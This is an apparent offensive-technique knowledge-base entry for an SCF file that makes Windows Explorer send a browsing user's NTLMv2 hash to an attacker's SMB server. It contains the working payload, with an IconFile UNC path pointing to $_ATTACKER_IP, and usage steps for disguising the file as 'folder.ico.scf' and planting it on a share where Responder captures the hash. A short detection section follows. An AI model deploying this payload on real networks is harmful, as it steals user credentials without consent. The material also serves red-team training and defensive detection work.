---
id: c094436b-5c35-4616-8626-4570909eaf59
name: SCF-File-for-NTLMv2-Hash-Stealing
type: code
language: scf
verified: true
created_at: '2020-03-16T07:45:13.240315+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Windows
tags:
  - ntlm
  - scf
  - credential-access
validated: true
---

# SCF-File-for-NTLMv2-Hash-Stealing

## Code

```scf
[Shell]
Command=2
IconFile=\\$_ATTACKER_IP\files\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

## Description

This SCF file is a malicious configuration that exploits Windows Explorer's auto-parsing of SCF files in folders. When placed in a directory and viewed by a vulnerable Windows user (pre-Windows 10), it triggers an SMB authentication to the specified remote path, disclosing the user's NTLMv2 hash to an attacker listening on that share.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker-controlled SMB server | 192.168.1.100 |

## Usage

Save the content to a file named something innocuous like 'folder.ico.scf' and place it in a network share or folder accessible to the target. When the target browses the folder in Explorer, the SCF loads the remote icon, authenticating via SMB and sending the hash to the attacker's Responder instance. No execution is required; it's passive.

## Detection

- Monitor Windows Event Logs for Event ID 4624 (logon attempts) with Type 3 (network) from unexpected sources.
- File integrity monitoring for .scf files in shared directories.
- Network traffic analysis for SMB connections to internal IPs without corresponding file access.
- Disable auto-loading of shell extensions via registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRemoteIcon=1).

## Related

- [[procedures/Steal-NTLMv2-Hash-with-SCF-File-and-SMB]]
- [[tools/Responder]]
